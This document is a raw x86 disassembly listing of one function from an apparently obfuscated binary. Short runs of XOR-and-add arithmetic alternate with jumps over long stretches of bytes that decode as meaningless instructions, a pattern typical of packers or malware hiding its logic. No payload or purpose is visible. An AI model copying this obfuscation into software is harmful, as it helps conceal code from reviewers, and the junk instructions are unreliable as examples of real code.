  40c069:	cmp    dh,0x1
  40c06c:	(bad)  
  40c06d:	stc    
  40c06e:	adc    BYTE PTR [edx-0x13c2c704],al
  40c074:	mov    al,0x1a
  40c076:	gs push es
  40c078:	and    ebx,eax
  40c07a:	wbinvd 
  40c07c:	ror    DWORD PTR [ebp+ebx*8+0x5],cl
  40c080:	mov    ds:0x510859b9,eax
  40c085:	pop    es
  40c086:	xor    edx,edx
  40c088:	xor    edi,ecx
  40c08a:	mov    esi,0x32729f
  40c08f:	add    edi,esi
  40c091:	div    edi
  40c093:	mov    edx,DWORD PTR [ebp-0x4]
  40c096:	xor    edx,ecx
  40c098:	lea    eax,[edx+eax*1+0x32729f]
  40c09f:	mov    edx,DWORD PTR [ebp+0x8]
  40c0a2:	mov    edi,DWORD PTR [ebp-0x24]
  40c0a5:	mov    DWORD PTR [edi+edx*4],eax
  40c0a8:	mov    eax,DWORD PTR [ebp-0x18]
  40c0ab:	mov    edx,DWORD PTR [ebp+0x8]
  40c0ae:	xor    eax,ecx
  40c0b0:	lea    eax,[eax+edx*1+0x32729f]
  40c0b7:	mov    DWORD PTR [ebp+0x8],eax
  40c0ba:	mov    eax,DWORD PTR [ebp-0x18]
  40c0bd:	mov    edx,DWORD PTR [ebp+0x14]
  40c0c0:	xor    eax,ecx
  40c0c2:	add    eax,esi
  40c0c4:	imul   eax,DWORD PTR [edx]
  40c0c7:	mov    edx,DWORD PTR [ebp-0x4]
  40c0ca:	xor    edx,ecx
  40c0cc:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0cf:	jmp    0x40c1b4
  40c0d4:	mov    ebx,0x61b1c335
  40c0d9:	pop    ecx
  40c0da:	mov    ecx,0x5c6a2de5
  40c0df:	xchg   edi,eax
  40c0e0:	or     eax,esp
  40c0e2:	mov    ebp,0x7e35e1cd
  40c0e7:	jle    0x40c09f
  40c0e9:	jle    0x40c169
  40c0eb:	jle    0x40c08c
  40c0ed:	rcl    DWORD PTR [esp+ebx*1+0x3d],0x11
  40c0f2:	dec    eax
  40c0f3:	(bad)  
  40c0f4:	xor    eax,0xa0dad675
  40c0f9:	mov    ds:0x8314d4ae,eax
  40c0fe:	xchg   BYTE PTR [esi+0x3d8cdfab],bl
  40c104:	sbb    bl,dl
  40c106:	(bad)  
  40c107:	mov    esi,0xe4ca74
  40c10c:	adc    ecx,edi
  40c10e:	stc    
  40c10f:	loope  0x40c155
  40c111:	dec    esi
  40c112:	pop    esi
  40c113:	push   ebp
  40c114:	push   0x32fab491
  40c119:	outs   dx,BYTE PTR ds:[esi]
  40c11a:	fs hlt 
  40c11c:	cmp    BYTE PTR [edx-0x7a],dh
  40c11f:	test   eax,0x6e4a58f3
  40c124:	push   es
  40c125:	fsubr  DWORD PTR [ebx+0x7932198b]
  40c12b:	ins    BYTE PTR es:[edi],dx
  40c12c:	mov    ds:0xc8eaf5fb,al
  40c131:	push   ds
  40c132:	rcl    DWORD PTR [ecx+ecx*1-0x2],1
  40c136:	retf   
  40c137:	sar    DWORD PTR [edx],0x3
  40c13a:	aam    0xe7
  40c13c:	lods   eax,DWORD PTR ds:[esi]
  40c13d:	and    ch,BYTE PTR [esi]
  40c13f:	jmp    edi
  40c141:	fdivr  DWORD PTR [eax-0x12]
  40c144:	sub    ecx,DWORD PTR [esi]
  40c146:	int3   
  40c147:	pop    edx
  40c148:	mov    ebx,0x1c1cfabd
  40c14d:	mov    ds,eax
  40c14f:	cmp    edi,DWORD PTR [ebx-0x7b6b98ea]
  40c155:	inc    ebx
  40c156:	push   ss
  40c157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c158:	push   edx
  40c159:	jb     0x40c1cd
  40c15b:	mov    ah,0x68
  40c15d:	inc    edx
  40c15e:	in     al,0x2f
  40c160:	jae    0x40c1ce
  40c162:	arpl   sp,dx
  40c164:	aaa    
  40c165:	das    
  40c166:	fsub   QWORD PTR [edi]
  40c168:	in     eax,0x20
  40c16a:	std    
  40c16b:	sub    bh,BYTE PTR [ecx-0x4b305214]
  40c171:	mov    al,ds:0x41a75196
  40c177:	aaa    
  40c178:	push   es
  40c179:	lods   eax,DWORD PTR ds:[esi]
  40c17a:	(bad)  
  40c17b:	popf   
  40c17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c17d:	jge    0x40c126
  40c17f:	mov    ch,0x34
  40c181:	mov    eax,0xb7e02356
  40c186:	imul   esi,ebx,0x77d62ebf
  40c18c:	push   esp
  40c18d:	dec    ebx
  40c18e:	pop    esp
  40c18f:	pop    edx
  40c190:	popf   
  40c191:	(bad)  
  40c192:	ss out 0xe1,al
  40c195:	sahf   
  40c196:	(bad)  
  40c197:	mov    edx,0xa7abb873
  40c19c:	stc    
  40c19d:	or     al,0xc
  40c19f:	daa    
  40c1a0:	dec    esp
  40c1a1:	not    DWORD PTR [ebx]
  40c1a3:	stc    
  40c1a4:	inc    ecx
  40c1a5:	sub    al,bl
  40c1a7:	nop
  40c1a8:	mov    ds:0xb45726a7,al
  40c1ad:	pop    edi
  40c1ae:	cld    
  40c1af:	dec    ebp
  40c1b0:	mov    ecx,DWORD PTR [eax+0x27]
  40c1b3:	sub    BYTE PTR [ebp+0x729f0a8c],cl
  40c1b9:	xor    al,BYTE PTR [eax]
  40c1bb:	cmp    ecx,eax
  40c1bd:	jne    0x40bf8f
  40c1c3:	mov    ebx,esi
  40c1c5:	jmp    0x40c2b4
  40c1ca:	mov    ebx,0x32729f
  40c1cf:	jmp    0x40c2b4
  40c1d4:	mov    al,0x75
  40c1d6:	or     eax,0x598459f4
  40c1db:	leave  
  40c1dc:	jns    0x40c1f9
  40c1de:	or     ah,BYTE PTR [ecx+0xd0dec09]
  40c1e4:	cmp    edx,ecx
  40c1e6:	jle    0x40c266
  40c1e8:	mov    dh,0x7e
  40c1ea:	jle    0x40c26a
  40c1ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ed:	or     al,0x7d
  40c1ef:	sub    edi,DWORD PTR ds:0x48760252
  40c1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f6:	push   0xfffffff3
  40c1f8:	mov    bl,BYTE PTR [eax+0x4ba3a363]
  40c1fe:	xor    DWORD PTR [ebx-0x5ae6b15],edx
  40c204:	cdq    
  40c205:	(bad)
  40c20a:	dec    eax
  40c20b:	pop    edi
  40c20c:	sub    eax,0xf93b0ffa
  40c211:	dec    eax
  40c212:	xchg   DWORD PTR [ecx],esp
  40c214:	jno    0x40c288
  40c216:	out    dx,al
  40c217:	(bad)  
  40c218:	neg    DWORD PTR [ebx]
  40c21a:	sub    edi,DWORD PTR [ebp+0x20676628]
  40c220:	das    
  40c221:	jne    0x40c235
  40c223:	nop
  40c224:	rcl    al,0x56
  40c227:	mov    eax,0xbfeefa01
  40c22c:	push   esp
  40c22d:	bound  eax,QWORD PTR [ebx-0x25a168b3]
  40c233:	mov    ebp,0x6ce7a90e
  40c238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c239:	fwait
  40c23a:	xor    ebp,DWORD PTR [ebx]
  40c23c:	imul   ebp,DWORD PTR [esi-0x4cb377c4],0xffffffb4
  40c243:	(bad)  
  40c244:	pop    ds
  40c245:	imul   edx,DWORD PTR [ecx],0xffffffb2
  40c248:	aas    
  40c249:	loopne 0x40c24a
  40c24b:	dec    ecx
  40c24c:	xchg   ebp,eax
  40c24d:	popf   
  40c24e:	add    eax,esp
  40c250:	xchg   ebx,eax
  40c251:	xchg   ebx,eax
  40c252:	addr16 aaa 
  40c254:	sub    DWORD PTR [esi-0x65aa567e],edx
  40c25a:	shr    DWORD PTR [esi-0x3760e77f],0x3
  40c261:	push   ss
  40c262:	loopne 0x40c20f
  40c264:	(bad)  
  40c265:	daa    
  40c266:	hlt    
  40c267:	mov    ebx,0xb00cb05b
  40c26c:	mov    eax,0x3ecb243c
  40c271:	push   eax
  40c272:	mov    ds,WORD PTR [esi-0x3d]
  40c275:	or     BYTE PTR [eax+esi*1+0x49773ad2],0xa2
  40c27d:	add    esi,ebp
  40c27f:	xlat   BYTE PTR ds:[ebx]
  40c280:	dec    ecx
  40c281:	into   
  40c282:	js     0x40c300
  40c284:	cmp    DWORD PTR [esi-0x21622196],eax
  40c28a:	adc    eax,0x7db3c42
  40c28f:	aad    0xbe
  40c291:	shr    dl,cl
  40c293:	test   BYTE PTR [edx-0x6b],dh
  40c296:	cmp    dl,ah
  40c298:	cwde   
  40c299:	adc    al,0x54
  40c29b:	sbb    dh,BYTE PTR [ebx]
  40c29d:	inc    ebp
  40c29e:	mov    ecx,0x3198f429
  40c2a3:	push   ecx
  40c2a4:	mov    edx,0xdc6fc9b6
  40c2a9:	rcr    DWORD PTR [edx],0xee
  40c2ac:	lods   eax,DWORD PTR ds:[esi]
  40c2ad:	adc    ebx,ecx
  40c2af:	not    BYTE PTR [edi-0x747e796d]
  40c2b5:	inc    ebp
  40c2b6:	cld    
  40c2b7:	xor    eax,0x7510859
  40c2bc:	add    eax,ebx
  40c2be:	mov    DWORD PTR [ebp-0xc],eax
  40c2c1:	xor    ebx,ebx
  40c2c3:	lea    eax,[ebp-0x10]
  40c2c6:	add    ebx,DWORD PTR [eax]
  40c2c8:	jmp    0x40c3ad
  40c2cd:	sbb    al,0xbe
  40c2cf:	cmp    al,0xc2
  40c2d1:	pop    esp
  40c2d2:	inc    eax
  40c2d3:	and    BYTE PTR [eax+0x3b],ah
  40c2d6:	gs xchg edx,ebp
  40c2d9:	js     0x40c2c8
  40c2db:	push   edi
  40c2dc:	popf   
  40c2dd:	jno    0x40c2aa
  40c2df:	jle    0x40c35f
  40c2e1:	mov    dh,0x7e
  40c2e3:	jle    0x40c363
  40c2e5:	sub    edx,ebx
  40c2e7:	gs mov bl,0x33
  40c2ea:	fisttp WORD PTR [eax+0x68]
  40c2ed:	xor    eax,0x81b3ebe6
  40c2f2:	jmp    0x5ced:0xa3229be1
  40c2f9:	addr16 jge 0x40c2b0
  40c2fc:	push   ebp
  40c2fd:	int    0x4c
  40c2ff:	call   FWORD PTR ds:0x49512162
  40c305:	jl     0x40c2f7
  40c307:	push   ss
  40c308:	aam    0xb3
  40c30a:	push   cs
  40c30b:	stc    
  40c30c:	dec    ebx
  40c30d:	push   ss
  40c30e:	(bad)  
  40c30f:	stc    
  40c310:	xchg   ecx,eax
  40c311:	cld    
  40c312:	push   ecx
  40c313:	sub    eax,0x4bc7442f
  40c318:	and    BYTE PTR es:[eax+0x179f9ecb],al
  40c31f:	mov    ebp,0x3c484819
  40c324:	adc    bh,BYTE PTR [ecx-0x6aae60cd]
  40c32a:	imul   DWORD PTR [eax]
  40c32c:	rcr    BYTE PTR ds:0x992010bb,1
  40c332:	push   ecx
  40c333:	adc    al,0xae
  40c335:	lds    ecx,FWORD PTR [edi-0x41]
  40c338:	xchg   edx,eax
  40c339:	xchg   ecx,eax
  40c33a:	ret    
  40c33b:	inc    esi
  40c33c:	cld    
  40c33d:	xchg   ebp,eax
  40c33e:	enter  0x60bb,0x18
  40c342:	imul   eax,DWORD PTR ds:0xfef1b982,0x53a033d9
  40c34c:	mov    edi,0xa266a3a3
  40c351:	inc    BYTE PTR [edi+ebp*2-0x19]
  40c355:	xchg   DWORD PTR [ebx+0x3f7c8f3b],eax
  40c35b:	vsqrtsd xmm4,xmm3,QWORD PTR [ebx]
  40c35f:	inc    ebx
  40c360:	cld    
  40c361:	dec    ebx
  40c362:	leave  
  40c363:	sbb    esi,ebp
  40c365:	pop    ds
  40c366:	lods   eax,DWORD PTR ds:[esi]
  40c367:	mov    eax,ds:0xd3dc135d
  40c36c:	es imul ecx
  40c36f:	add    DWORD PTR [edi+0x76],0x1ff6de63
  40c376:	test   DWORD PTR [ebp+edi*4-0x3f],ecx
  40c37a:	pop    edx
  40c37b:	hlt    
  40c37c:	jp     0x40c380
  40c37e:	pop    eax
  40c37f:	outs   dx,DWORD PTR ds:[esi]
  40c380:	add    bl,cl
  40c382:	icebp  
  40c383:	push   esp
  40c384:	je     0x40c30f
  40c386:	sbb    ah,cl
  40c388:	not    DWORD PTR [edi]
  40c38a:	mov    ds:0x598909c6,al
  40c38f:	mov    dh,0xeb
  40c391:	cli    
  40c392:	or     BYTE PTR [ebx+0x53fd2177],dh
  40c398:	push   ds
  40c399:	rcl    DWORD PTR [ebx],1
  40c39b:	pusha  
  40c39c:	sub    ecx,DWORD PTR [ebx+0x6e]
  40c39f:	add    eax,edi
  40c3a1:	mov    WORD PTR [ebp+0x1e],es
  40c3a4:	ret    0x989c
  40c3a7:	mov    ebx,0xf50d80d9
  40c3ac:	scas   al,BYTE PTR es:[edi]
  40c3ad:	call   ebx
  40c3af:	xor    ebx,ebx
  40c3b1:	jmp    0x40c496
  40c3b6:	popa   
  40c3b7:	jno    0x40c409
  40c3b9:	jnp    0x40c41b
  40c3bb:	jnp    0x40c436
  40c3bd:	or     DWORD PTR ds:0x762e5fee,ecx
  40c3c3:	test   DWORD PTR ss:[ecx+ecx*2-0x49818135],esi
  40c3cb:	jle    0x40c44b
  40c3cd:	jle    0x40c40d
  40c3cf:	mov    DWORD PTR [edi+ecx*4-0x64],edi
  40c3d3:	ja     0x40c361
  40c3d5:	retf   0x1fc1
  40c3d8:	mov    esi,0xfd754b91
  40c3dd:	(bad)  [edi+0x7cf19e4d]
  40c3e3:	or     dl,al
  40c3e5:	adc    eax,0x14a3fea0
  40c3ea:	sub    BYTE PTR ss:[edi+edi*8+0x1e],dh
  40c3ef:	inc    eax
  40c3f0:	shl    BYTE PTR [eax],1
  40c3f2:	jg     0x40c41b
  40c3f4:	cwde   
  40c3f5:	dec    esp
  40c3f6:	cwde   
  40c3f7:	fidiv  WORD PTR ss:[eax+0x2161f0f3]
  40c3fe:	xchg   DWORD PTR [ecx],esi
  40c400:	xor    DWORD PTR [edi+edi*8+0x7c],ebp
  40c404:	or     al,0x47
  40c406:	repz scas eax,DWORD PTR es:[edi]
  40c408:	dec    ebx
  40c409:	mov    dl,0xe4
  40c40b:	xchg   edi,eax
  40c40c:	mov    ebp,DWORD PTR [edi+0x86c7cc5]
  40c412:	inc    ebx
  40c413:	dec    edx
  40c414:	les    edx,FWORD PTR [ebp-0x16]
  40c417:	push   0xca39614f
  40c41c:	in     al,0x59
  40c41e:	into   
  40c41f:	cmp    al,0x87
  40c421:	add    dl,BYTE PTR [ecx+0x7d08f6dd]
  40c427:	jne    0x40c43f
  40c429:	jmp    0x6870:0x7196108b
  40c430:	test   DWORD PTR [eax-0x293c594c],0xfffe4b9d
  40c43a:	pop    eax
  40c43b:	frstor [ecx+0x31]
  40c43e:	or     al,0x2e
  40c440:	and    dh,ah
  40c442:	and    dh,BYTE PTR [eax+0x65]
  40c445:	test   al,0x3c
  40c447:	sub    al,0xf0
  40c449:	mov    esp,0xa37dde1e
  40c44e:	add    ax,di
  40c451:	cmp    edx,DWORD PTR [esi+0x74d6a2e0]
  40c457:	ffreep st(6)
  40c459:	cmp    BYTE PTR [ebx+esi*8],ah
  40c45c:	loopne 0x40c45b
  40c45e:	jge    0x40c400
  40c460:	int3   
  40c461:	inc    esi
  40c462:	and    al,0xc1
  40c464:	lea    ebx,[ebx+0x61ad3394]
  40c46a:	lahf   
  40c46b:	mov    edi,0xa0f2f0be
  40c470:	and    DWORD PTR [eax+0x1d],0xac5b8dc6
  40c477:	jp     0x40c45e
  40c479:	and    ebp,0x7ddfb41a
  40c47f:	(bad)  
  40c480:	pop    ebp
  40c481:	(bad)  [esi]
  40c483:	pop    DWORD PTR [edi+0x571e68cc]
  40c489:	call   0xb59d:0x51421f67
  40c490:	mov    ebx,0x983281c6
  40c495:	mov    cl,0x43
  40c497:	cmp    DWORD PTR [ebp+0x10],ebx
  40c49a:	jmp    0x40c57f
  40c49f:	test   al,0xfc
  40c4a1:	xchg   esi,eax
  40c4a2:	push   esi
  40c4a3:	stos   BYTE PTR es:[edi],al
  40c4a4:	push   esp
  40c4a5:	push   0xe4b270b0
  40c4aa:	gs add edx,edx
  40c4ad:	icebp  
  40c4ae:	cs or  eax,0x7eb67e7e
  40c4b5:	jle    0x40c535
  40c4b7:	push   ebx
  40c4b8:	xor    edx,DWORD PTR [edx]
  40c4ba:	or     DWORD PTR [ebx-0xbe8125d],ebp
  40c4c0:	imul   DWORD PTR [ebx-0x20b62351]
  40c4c6:	scas   eax,DWORD PTR es:[edi]
  40c4c7:	icebp  
  40c4c8:	push   cs
  40c4c9:	cmp    eax,edx
  40c4cb:	cmp    al,0x3f
  40c4cd:	xchg   BYTE PTR [ecx],ch
  40c4cf:	dec    edi
  40c4d0:	push   0x35
  40c4d2:	loope  0x40c538
  40c4d4:	in     al,dx
  40c4d5:	pushf  
  40c4d6:	sub    DWORD PTR [ecx+eiz*8],ebp
  40c4d9:	(bad)  
  40c4db:	repz enter 0xcbf5,0x29
  40c4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4e1:	push   0xc26b2da7
  40c4e6:	cmp    dl,0x6d
  40c4e9:	test   eax,0xc370f8b1
  40c4ee:	mov    bl,0x47
  40c4f0:	push   edx
  40c4f1:	mov    eax,0xa0049c8b
  40c4f6:	in     eax,dx
  40c4f7:	pop    ebx
  40c4f8:	outs   dx,BYTE PTR ds:[esi]
  40c4f9:	out    0x54,eax
  40c4fb:	adc    ah,BYTE PTR [esi+0x4704437e]
  40c501:	(bad)  
  40c502:	shld   esi,ebp,0x30
  40c506:	add    al,dh
  40c508:	popf   
  40c509:	xchg   edx,eax
  40c50a:	pop    ds
  40c50b:	dec    DWORD PTR [ebp+0x2729269f]
  40c511:	imul   ch
  40c513:	nop
  40c514:	mov    al,ds:0xa92fdbad
  40c519:	icebp  
  40c51a:	mov    ebp,0x7c31d2fb
  40c51f:	out    0x1c,al
  40c521:	cmp    esi,DWORD PTR [ebp+0x56ab93e4]
  40c527:	mov    DWORD PTR ds:0x75678b04,edx
  40c52d:	pop    es
  40c52e:	test   BYTE PTR [ecx],ch
  40c530:	std    
  40c531:	mov    ecx,?
  40c533:	xchg   esi,eax
  40c534:	fsubp  st(4),st
  40c536:	ins    BYTE PTR es:[edi],dx
  40c537:	xor    BYTE PTR [edi-0x51],ah
  40c53a:	ds test al,0x8a
  40c53d:	ret    0x83ef
  40c540:	push   ebp
  40c541:	loope  0x40c4c9
  40c543:	call   0x1b48:0xa33b8b0
  40c54a:	mov    esi,0x668fa233
  40c54f:	imul   edi,DWORD PTR [esi+0x3fcb8c2f],0xffffffd7
  40c556:	and    bl,ah
  40c558:	mov    ds:0x41b0d9ae,al
  40c55d:	mov    edi,0x3f9684df
  40c562:	into   
  40c563:	inc    edi
  40c564:	pushf  
  40c565:	or     BYTE PTR [ecx],dl
  40c567:	popf   
  40c568:	xchg   ecx,eax
  40c569:	xchg   ecx,eax
  40c56a:	push   cs
  40c56b:	xchg   ebx,eax
  40c56c:	mov    edi,0x356426ad
  40c571:	inc    eax
  40c572:	fcomp  st(6)
  40c574:	sbb    ebx,DWORD PTR [ebx+edx*4+0x7b]
  40c578:	sbb    eax,0x1ac0093f
  40c57d:	mov    dl,0x1b
  40c57f:	je     0x40c682
  40c585:	xchg   edx,eax
  40c586:	push   0xa
  40c588:	pop    ecx
  40c589:	push   0x4
  40c58b:	pop    ebx
  40c58c:	inc    ebx
  40c58d:	xchg   ebx,ecx
  40c58f:	sub    ebx,ecx
  40c591:	xchg   ebx,ecx
  40c593:	jmp    0x40c678
  40c598:	xchg   DWORD PTR [eax+0x3d],ebx
  40c59b:	out    0x31,al
  40c59d:	jnp    0x40c544
  40c59f:	jns    0x40c5e7
  40c5a1:	add    al,0x4b
  40c5a3:	call   0xa01f09b2
  40c5a8:	fxch   st(1)
  40c5aa:	jle    0x40c62a
  40c5ac:	mov    dh,0x7e
  40c5ae:	jle    0x40c62e
  40c5b0:	fidiv  DWORD PTR [ebx+0x670f985f]
  40c5b6:	leave  
  40c5b7:	push   0x785a12c4
  40c5bc:	mov    DWORD PTR [edi+0x4c80d93b],esi
  40c5c2:	in     al,dx
  40c5c3:	xor    ah,BYTE PTR [ebp+0x6c]
  40c5c6:	sub    eax,0x155a7fd0
  40c5cb:	lds    esp,FWORD PTR [ecx-0x513f6fbb]
  40c5d1:	xor    al,0x5e
  40c5d3:	ins    BYTE PTR es:[edi],dx
  40c5d4:	stc    
  40c5d5:	outs   dx,BYTE PTR ds:[esi]
  40c5d6:	popf   
  40c5d7:	mov    cl,BYTE PTR [ebp-0x405759]
  40c5dd:	shl    bh,0x25
  40c5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5e1:	adc    al,0x2d
  40c5e3:	fnstcw WORD PTR [esi]
  40c5e5:	cmp    eax,0xd50823a3
  40c5ea:	iret   
  40c5eb:	cvtps2pd xmm5,QWORD PTR [esi+0xab3f8a0]
  40c5f2:	and    DWORD PTR ds:0xc94bd687,edx
  40c5f8:	xor    al,0x65
  40c5fa:	push   ebx
  40c5fb:	nop
  40c5fc:	out    0xbc,al
  40c5fe:	jge    0x40c635
  40c600:	or     dl,BYTE PTR [edi]
  40c602:	rcl    BYTE PTR [ebx+0x53589dfa],1
  40c608:	(bad)  
  40c609:	sar    BYTE PTR [esi],cl
  40c60b:	pop    edi
  40c60c:	mov    dh,0x64
  40c60e:	add    BYTE PTR [edi+0x5f],0x66
  40c612:	aaa    
  40c613:	and    al,0xfd
  40c615:	xchg   ebp,eax
  40c616:	or     al,BYTE PTR [edi+ebx*1+0x47]
  40c61a:	dec    eax
  40c61b:	int    0x7e
  40c61d:	fstp   QWORD PTR [ecx-0x8d4b29b]
  40c623:	sbb    DWORD PTR [edi-0x50],esi
  40c626:	lds    ebp,FWORD PTR [edx]
  40c628:	enter  0x5cab,0x32
  40c62c:	stos   DWORD PTR es:[edi],eax
  40c62d:	dec    esp
  40c62e:	adc    edx,DWORD PTR [ecx-0x4c3c7dde]
  40c634:	jmp    0x40c67a
  40c636:	xor    ebp,DWORD PTR [edx-0x42]
  40c639:	dec    ecx
  40c63a:	inc    edi
  40c63b:	(bad)
  40c63e:	pop    DWORD PTR [ebx]
  40c640:	ds clc 
  40c642:	jg     0x40c628
  40c644:	lods   eax,DWORD PTR ds:[esi]
  40c645:	cmc    
  40c646:	jle    0x40c685
  40c648:	xsha256 (bad)
  40c649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c64a:	push   esi
  40c64b:	icebp  
  40c64c:	push   0x33d01c54
  40c651:	sub    esi,edx
  40c653:	imul   BYTE PTR [ebx-0x29]
  40c656:	adc    WORD PTR [ecx+0x4b],dx
  40c65a:	xchg   ebx,eax
  40c65b:	fcmovnb st,st(6)
  40c65d:	aad    0x4a
  40c65f:	push   edx
  40c660:	addr16 test eax,0xaf501faf
  40c666:	cld    
  40c667:	dec    edi
  40c668:	dec    edi
  40c669:	cmp    al,BYTE PTR [ebx-0x2c3a1028]
  40c66f:	mov    dl,0x9f
  40c671:	pusha  
  40c672:	ror    al,0x70
  40c675:	enter  0x3245,0x49
  40c679:	mov    eax,DWORD PTR [ebp-0x1c]
  40c67c:	imul   eax,ecx
  40c67f:	add    esp,eax
  40c681:	xchg   edx,eax
  40c682:	push   eax
  40c683:	xor    ebx,ebx
  40c685:	mov    edx,esp
  40c687:	dec    edx
  40c688:	inc    ebx
  40c689:	add    ebx,DWORD PTR [edx+ebx*1]
  40c68c:	dec    ebx
  40c68d:	xor    edx,edx
  40c68f:	add    DWORD PTR [ebp-0xc],ebx
  40c692:	pop    ebx
  40c693:	mov    eax,DWORD PTR [ebp-0xc]
  40c696:	pop    edi
  40c697:	pop    esi
  40c698:	pop    ebx
  40c699:	leave  
  40c69a:	ret    0x10
